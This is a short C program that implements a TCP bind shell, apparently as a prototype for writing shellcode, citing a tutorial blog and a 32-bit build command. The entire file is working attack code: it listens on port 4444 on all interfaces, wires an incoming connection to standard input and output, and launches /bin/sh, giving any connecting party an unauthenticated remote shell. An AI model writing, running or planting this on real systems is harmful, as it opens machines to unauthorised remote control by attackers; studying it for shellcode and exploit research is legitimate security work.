#include<stdio.h>
#include<sys/socket.h>
#include<netinet/ip.h>
#include<unistd.h>

// https://rastating.github.io/creating-a-bind-shell-tcp-shellcode/
// gcc -m32 bindshelltcp.c -o bindshelltcp

int main()
{
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	addr.sin_addr.s_addr = INADDR_ANY;

	int s = socket(AF_INET,SOCK_STREAM,0);
	bind(s,(struct sockaddr *)&addr,sizeof(addr));
	listen(s,0);

	int conn = accept(s,NULL,NULL);
	for(int i = 0;i < 3;i++){
		dup2(conn,i);
	}
	
	execve("/bin/sh",NULL,NULL);
	return 0;
}
